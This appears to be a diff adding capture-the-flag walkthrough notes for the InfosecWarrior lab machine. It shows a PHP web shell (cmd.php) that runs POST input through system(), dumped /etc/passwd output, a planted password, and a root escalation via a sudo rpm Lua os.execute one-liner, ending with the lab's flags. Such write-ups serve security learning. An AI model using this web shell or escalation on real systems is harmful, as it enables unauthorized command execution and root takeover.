@@ -40,4 +40,91 @@ cmd.php --> redirect
 
 
 
+You Found ME : - (
+
+uid=48(apache) gid=48(apache) groups=48(apache) context=system_u:system_r:httpd_t:s0
+
+
+
+You Found ME : - (<pre>root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
+saslauth:x:499:76:Saslauthd user:/var/empty/saslauth:/sbin/nologin
+postfix:x:89:89::/var/spool/postfix:/sbin/nologin
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+apache:x:48:48:Apache:/var/www:/sbin/nologin
+isw0:x:500:500::/home/isw0:/bin/bash
+isw1:x:501:501::/home/isw1:/home/isw1/bash
+isw2:x:502:502::/home/isw2:/bin/bash
+dbus:x:81:81:System message bus:/:/sbin/nologin
+avahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologin
+
+
+cmd.php
+
+
+if(isset($_GET['AI'])){
+	echo "Now the main part what it is loooooool";
+	echo "<br>";
+
+echo "Try other method";
+        die;
+}
+
+if(isset($_POST['AI'])){
+        echo "You Found ME : - (";
+	echo "<pre>";
+        $cmd = ($_POST['AI']);
+        system($cmd);
+        echo "</pre>";
+        die;
+}
+else {
+
+header("Location: https://www.armourinfosec.com/category/information-gathering/");
+}
+
+$user="isw0";
+$pass="123456789blabla";
+
+?>
+
+
+[isw0@InfosecWarrior ~]$ cat isw0_user 
+e4408105ca9c2a5c2714a818c475d06e
+
+
+
+[isw0@InfosecWarrior ~]$ sudo rpm --eval '%{lua:os.execute("/bin/sh")}'
+[sudo] password for isw0: 
+sh-4.1# 
+sh-4.1# id
+uid=0(root) gid=0(root) gruppi=0(root) context=unconfined_u:system_r:rpm_script_t:s0-s0:c0.c1023
+sh-4.1# ls
+isw0_user
+sh-4.1# cd /root
+sh-4.1# ls
+anaconda-ks.cfg  Armour.sh  flag.txt  install.log  install.log.syslog
+sh-4.1# cat flag.txt
+fc9c6eb6265921315e7c70aebd22af7e
+sh-4.1# cat Armour.sh
+/etc/init.d/sshd restart
+/etc/init.d/httpd restart
+rm -rf /tmp/*
+sh-4.1# 
+
+
 
